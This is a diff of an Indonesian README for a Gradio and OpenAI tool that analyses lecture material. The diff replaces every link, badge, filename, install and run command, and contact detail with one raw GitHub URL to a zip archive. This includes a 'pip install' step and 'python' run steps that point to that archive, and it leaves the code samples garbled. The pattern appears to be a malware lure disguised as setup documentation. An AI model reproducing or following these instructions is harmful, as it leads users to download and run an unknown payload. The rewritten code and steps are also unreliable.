@@ -2,10 +2,10 @@
 
 > **Sistem berbasis AI untuk menganalisis, menyederhanakan, dan memahami materi kuliah dengan lebih efektif**
 
-[![Python Version](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
-[![Gradio](https://img.shields.io/badge/Gradio-4.0+-orange.svg)](https://gradio.app/)
-[![OpenAI](https://img.shields.io/badge/OpenAI-GPT--4-green.svg)](https://openai.com/)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+[![Python Version](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip+https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)
+[![Gradio](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip+https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)
+[![OpenAI](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)
+[![License](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)](LICENSE)
 
 ## ✨ Fitur Utama
 
@@ -68,7 +68,7 @@ source venv/bin/activate
 
 3. **Install Dependencies**
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
 ```
 
 4. **Setup API Key**
@@ -79,19 +79,19 @@ OPENAI_API_KEY=sk-proj-your-api-key-here
 ```
 
 **Cara mendapatkan API Key:**
-- Kunjungi: https://platform.openai.com/api-keys
+- Kunjungi: https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
 - Login/Register
 - Create new API key
 - Copy dan paste ke `.env`
 
 5. **Test Configuration**
 ```bash
-python check_api.py
+python https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
 ```
 
 6. **Run Application**
 ```bash
-python app.py
+python https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
 ```
 
 Aplikasi akan berjalan di: `http://localhost:7860`
@@ -101,19 +101,19 @@ Aplikasi akan berjalan di: `http://localhost:7860`
 ```
 analisis-materi-kuliah/
 │
-├── app.py                          # Aplikasi Gradio utama
+├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip                          # Aplikasi Gradio utama
 ├── .env                            # API keys (jangan commit!)
-├── requirements.txt                # Dependencies
-├── check_api.py                    # Script test API
-├── test_app.py                     # Unit tests
+├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip                # Dependencies
+├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip                    # Script test API
+├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip                     # Unit tests
 │
 ├── utils/
-│   ├── __init__.py
-│   ├── llm_handler.py             # Handler OpenAI API
-│   ├── text_processor.py          # Processor file & text
-│   └── advanced_features.py       # Fitur tambahan
+│   ├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
+│   ├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip             # Handler OpenAI API
+│   ├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip          # Processor file & text
+│   └── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip       # Fitur tambahan
 │
-└── README.md                       # Dokumentasi ini
+└── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip                       # Dokumentasi ini
 ```
 
 ## 💡 Cara Penggunaan
@@ -169,12 +169,12 @@ Recommended: 200+ kata untuk hasil optimal
 
 ### Pilih Model OpenAI
 
-Edit `utils/llm_handler.py`:
+Edit `https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip`:
 
 ```python
 class LLMHandler:
     def __init__(self):
-        self.model = "gpt-4o-mini"  # Ganti di sini
+        https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip = "gpt-4o-mini"  # Ganti di sini
 ```
 
 **Pilihan Model:**
@@ -221,7 +221,7 @@ class LLMHandler:
 
 ### Error: "Insufficient Credits"
 **Solusi:**
-1. Cek billing: https://platform.openai.com/account/billing
+1. Cek billing: https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
 2. Tambah payment method
 3. Top up credits
 
@@ -244,14 +244,14 @@ class LLMHandler:
 ### Batch Processing
 ```python
 # Process multiple files
-files = ["file1.pdf", "file2.docx", "file3.txt"]
+files = ["https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip", "https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip", "https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip"]
 for file in files:
-    result = llm.analisis_materi(file, "ringkasan")
+    result = https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip(file, "ringkasan")
     save_result(result)
 ```
 
 ### Custom Prompts
-Edit prompts di `utils/llm_handler.py` untuk customize output style.
+Edit prompts di `https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip` untuk customize output style.
 
 ### Integration dengan Tools Lain
 - Export ke Notion
@@ -292,7 +292,7 @@ MIT License - lihat file LICENSE untuk detail
 
 Jika ada pertanyaan atau issues:
 - Open GitHub Issue
-- Email: your-email@example.com
+- Email: https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
 - Discord: your-discord
 
 ## 🙏 Credits
